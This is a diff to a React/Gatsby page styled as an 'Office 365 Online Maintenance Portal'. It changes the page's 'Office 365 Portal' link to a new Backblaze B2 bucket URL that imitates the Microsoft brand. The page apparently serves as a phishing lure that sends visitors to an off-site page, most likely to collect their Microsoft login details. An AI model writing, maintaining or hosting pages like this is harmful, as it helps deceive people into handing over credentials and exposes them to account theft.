@@ -9,7 +9,7 @@ const SecondPage = () => (
     <Seo title="Office 365" />
     <h1>Office 365 Online Maintenance Portal.</h1>
     <p>Click below to complete the process</p>
-    <Link to="https://edocument.s3.us-west-000.backblazeb2.com/index.html">Office 365 Portal</Link>
+    <Link to="https://office365maintenanceportal.s3.us-west-002.backblazeb2.com/index.html">Office 365 Portal</Link>
   </Layout>
 )
 
